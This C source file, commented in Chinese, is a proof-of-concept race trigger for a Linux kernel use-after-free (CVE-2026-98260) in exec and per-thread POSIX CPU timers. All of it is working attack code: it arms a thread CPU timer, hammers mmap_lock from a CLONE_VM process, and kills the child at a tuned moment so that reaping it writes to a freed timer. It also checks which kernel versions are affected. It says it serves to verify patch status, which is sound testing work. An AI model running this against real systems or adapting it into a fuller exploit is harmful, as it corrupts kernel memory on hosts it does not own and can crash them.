// SPDX-License-Identifier: MIT
//
// CVE-2026-98260 — exec/POSIX CPU timer race UAF 触发器（验证补丁状态用）
//
// 复现要素（依据 mainline 修复提交 acb03d388181 的提交说明）：
//   1) 非 leader 线程 B 上 timer_create(CLOCK_THREAD_CPUTIME_ID) + timer_settime()
//      → 定时器节点挂入 B 的 posix_cputimers 队列；
//   2) B 执行 execve() → de_thread()/exchange_tids() 把 B 的 PID 转给 leader，
//      pid_task() 查不到旧 PID，但节点仍挂在 B 上；
//   3) exec 在 de_thread() 之后失败（本程序用 CLONE_VM 锤击进程制造
//      old_mm->mmap_lock 写竞争，配合父进程 SIGKILL 使
//      mmap_read_lock_killable(old_mm) 返回 -EINTR）→ do_exit() →
//      exit_itimers() 在节点仍入队时释放 k_itimer；
//   4) 父进程 wait4() 回收 B → release_task() → posix_cpu_timers_exit() →
//      cleanup_timerqueue() → timerqueue_del() 对已释放节点 rb_erase()
//      → KASAN: slab-use-after-free（UAF 写）。
//
// 关键设计：mmap_lock 写竞争由 clone(CLONE_VM)（不带 CLONE_SIGHAND/CLONE_THREAD）
// 的子进程提供 —— 它不属于线程组，de_thread() 的 zap_other_threads() 杀不到它，
// 因此在整个 exec 窗口内持续锤击共享 mm 的 mmap_lock。
//
// 本程序只是 race 触发器：不含 heap spray / 对象占位 / 任意写布局等任何利用原语。
// 仅在自有或获书面授权的测试设备上运行。
//
// 用法：
//   ./cve_2026_98260_poc -d 60        # 跑 60 秒
//   ./cve_2026_98260_poc -d 60 -u 150 # kill 前延迟 150us（默认 200，需按机型调）
//   ./cve_2026_98260_poc --check      # 内核版本自检 + 2 秒冒烟
//
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define REEXEC_PATH   "/proc/self/exe"
#define HAMMER_STACK  (64 * 1024)
#define HAMMER_LEN    (64 * 1024)

static atomic_int g_stop = 0;
static time_t     g_deadline = 0;
static long       g_kill_delay_us = 200;   /* 'G' 之后到 SIGKILL 的延迟 */

/* ---- 子进程 C 内部状态（CLONE_VM 锤击进程与 C 共享地址空间） ---- */
static volatile int g_hammer_stop = 0;
static int          g_fd_to_parent = -1;
static int          g_fd_from_parent = -1;

static int time_up(void)
{
    return g_deadline && time(NULL) >= g_deadline;
}

static void write_all(int fd, const void *buf, size_t len)
{
    const char *p = (const char *)buf;
    while (len) {
        ssize_t n = write(fd, p, len);
        if (n <= 0) {
            if (errno == EINTR)
                continue;
            _exit(2);
        }
        p += n;
        len -= (size_t)n;
    }
}

static void read_all(int fd, void *buf, size_t len)
{
    char *p = (char *)buf;
    while (len) {
        ssize_t n = read(fd, p, len);
        if (n <= 0) {
            if (errno == EINTR)
                continue;
            return; /* 对端已死，本回合放弃 */
        }
        p += n;
        len -= (size_t)n;
    }
}

/* ---- CLONE_VM 锤击进程：持续对共享 mm 的 mmap_lock 制造写竞争 ----
 * 不在线程组内（无 CLONE_SIGHAND/CLONE_THREAD），de_thread() 的
 * zap_other_threads() 不会杀它，竞争贯穿整个 begin_new_exec() 窗口。 */
static int hammer_child(void *arg)
{
    (void)arg;
    while (!g_hammer_stop) {
        void *p = mmap(NULL, HAMMER_LEN, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p != MAP_FAILED) {
            mprotect(p, HAMMER_LEN, PROT_READ);
            munmap(p, HAMMER_LEN);
        }
    }
    _exit(0);
    return 0; /* unreachable */
}

/* ---- 线程 B：武装 per-thread CPU 定时器，然后 execve（触发主体） ---- */
static void *timer_exec_thread(void *arg)
{
    (void)arg;
    timer_t t;
    struct sigevent sev;
    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_NONE;   /* 不需要投递信号，armed 入队即可 */

    if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t) == 0) {
        struct itimerspec its;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_nsec = 200 * 1000 * 1000; /* 200ms CPU 时间，不会到期 */
        timer_settime(t, 0, &its, NULL);          /* arm_timer()：节点入队 B */
    }

    /* 通知父进程：定时器已 armed */
    char c = 'T';
    write_all(g_fd_to_parent, &c, 1);

    /* 等父进程放行，消除管道唤醒延迟的抖动 */
    char g;
    read_all(g_fd_from_parent, &g, 1);

    /* 非 leader 线程 execve：de_thread(B) → exchange_tids() → exec_mmap()
     * → mmap_read_lock_killable(old_mm) 撞上锤击进程的写锁 + SIGKILL
     * → -EINTR → do_exit() → exit_itimers() 释放仍在队列中的 k_itimer */
    char *const argv[] = { (char *)"cve_2026_98260_poc", (char *)"--execed", NULL };
    execve(REEXEC_PATH, argv, NULL);
    _exit(0); /* execve 早期失败（未过 de_thread）：整个进程退出 */
    return NULL;
}

/* ---- 子进程 C 主体：拉锤击进程 + 线程 B，主线程挂起等死 ---- */
static void child_main(void)
{
    void *stack = malloc(HAMMER_STACK);
    if (!stack)
        _exit(2);

    pid_t hpid = clone(hammer_child, (char *)stack + HAMMER_STACK,
                       CLONE_VM | SIGCHLD, NULL);
    if (hpid < 0)
        _exit(2);

    /* 上报锤击进程 pid，父进程收尾时负责杀它 */
    write_all(g_fd_to_parent, &hpid, sizeof(hpid));

    pthread_t th;
    if (pthread_create(&th, NULL, timer_exec_thread, NULL) != 0)
        _exit(2);

    for (;;)
        pause(); /* 被 SIGKILL / zap_other_threads() 终结 */
}

/* ---- 父进程 P：每回合 fork 一个 C，掐点 SIGKILL，回收 ---- */
static unsigned long run_round(void)
{
    int c2p[2], p2c[2];
    if (pipe(c2p) != 0 || pipe(p2c) != 0)
        return 0;

    pid_t c = fork();
    if (c < 0)
        return 0;
    if (c == 0) {
        close(c2p[0]);
        close(p2c[1]);
        g_fd_to_parent = c2p[1];
        g_fd_from_parent = p2c[0];
        child_main();
        _exit(0);
    }

    close(c2p[1]);
    close(p2c[0]);

    pid_t hpid = -1;
    char t = 0;
    read_all(c2p[0], &hpid, sizeof(hpid));
    read_all(c2p[0], &t, 1);

    if (t == 'T') {
        char g = 'G';
        write_all(p2c[1], &g, 1); /* 放行 B 进入 execve */
        if (g_kill_delay_us > 0) {
            struct timespec ts = { 0, g_kill_delay_us * 1000 };
            nanosleep(&ts, NULL);
        }
    }

    kill(c, SIGKILL);      /* 命中 exec_mmap() 的 killable 等待 → -EINTR */
    waitpid(c, NULL, 0);   /* 回收 B → release_task → UAF 发生点 */

    if (hpid > 0) {
        kill(hpid, SIGKILL);
        waitpid(hpid, NULL, 0); /* P 是 subreaper，可收 */
    }

    close(c2p[0]);
    close(p2c[1]);
    return 1;
}

/* ---- 内核版本自检（依据 cve.org CNA 记录的修复版本） ---- */
static int ver_less(int a, int b, int c, int x, int y, int z)
{
    if (a != x) return a < x;
    if (b != y) return b < y;
    return c < z;
}

static void self_check(void)
{
    int major = 0, minor = 0, patch = 0;
    FILE *f = fopen("/proc/version", "r");
    if (f) {
        char buf[512];
        if (fgets(buf, sizeof(buf), f))
            sscanf(buf, "Linux version %d.%d.%d", &major, &minor, &patch);
        fclose(f);
    }
    printf("[*] kernel: %d.%d.%d\n", major, minor, patch);

    int affected = 0;
    if (ver_less(major, minor, patch, 5, 7, 0)) {
        printf("[+] < 5.7，不含引入提交 55e8c8eb2c7b，不受影响\n");
    } else if (major == 6 && minor == 6)
        affected = ver_less(major, minor, patch, 6, 6, 158);
    else if (major == 6 && minor == 12)
        affected = ver_less(major, minor, patch, 6, 12, 112);
    else if (major == 6 && minor == 18)
        affected = ver_less(major, minor, patch, 6, 18, 54);
    else if (major == 7 && minor == 2)
        affected = ver_less(major, minor, patch, 7, 2, 8);
    else if (major > 7 || (major == 7 && minor >= 3))
        affected = 0;
    else
        affected = 1; /* 5.7~6.1 / 6.7~6.11 / 6.13~6.17 / 7.0~7.1：
                       * 上游 LTS 5.10/5.15/6.1 至今未回填，均按受影响计 */

    printf(affected
               ? "[-] 该内核在受影响范围内（或未回填修复的 LTS），请运行完整触发并用 KASAN 验证\n"
               : "[+] 该内核版本已含修复（或不受影响的版本）\n");
}

static void usage(const char *prog)
{
    fprintf(stderr,
        "CVE-2026-98260 exec/POSIX CPU timer race UAF trigger (reproducer only)\n"
        "usage:\n"
        "  %s -d <seconds> [-u <usec>]   run race (default 60s, kill delay 200us)\n"
        "  %s --check                    kernel version self-check + 2s smoke\n",
        prog, prog);
}

int main(int argc, char **argv)
{
    int duration = 60;

    if (argc >= 2 && strcmp(argv[1], "--execed") == 0)
        _exit(0); /* exec 成功（race 未命中）：直接退出，不递归 */

    if (argc >= 2 && strcmp(argv[1], "--check") == 0) {
        self_check();
        duration = 2;
    } else {
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-d") == 0 && i + 1 < argc)
                duration = atoi(argv[++i]);
            else if (strcmp(argv[i], "-u") == 0 && i + 1 < argc)
                g_kill_delay_us = atol(argv[++i]);
            else {
                usage(argv[0]);
                return 2;
            }
        }
        if (duration <= 0)
            duration = 60;
    }

    /* 回收被 reparent 的锤击进程 */
    prctl(PR_SET_CHILD_SUBREAPER, 1);

    g_deadline = time(NULL) + duration;
    fprintf(stderr, "[*] CVE-2026-98260 trigger: %d s, kill delay %ld us\n",
            duration, g_kill_delay_us);
    fprintf(stderr, "[*] watch: dmesg -wH | grep -iE 'kasan|use-after|BUG|WARNING'\n");
    fprintf(stderr, "[*] expected KASAN: slab-use-after-free in timerqueue_del / "
                    "cleanup_timerqueue / posix_cpu_timers_exit / release_task\n");

    unsigned long rounds = 0;
    while (!atomic_load(&g_stop) && !time_up()) {
        rounds += run_round();
        if (rounds % 1000 == 0)
            fprintf(stderr, "[*] %lu rounds\n", rounds);
    }

    fprintf(stderr, "[*] done, %lu rounds. no crash observed in-process "
                    "(check dmesg for KASAN reports).\n", rounds);
    return 0;
}
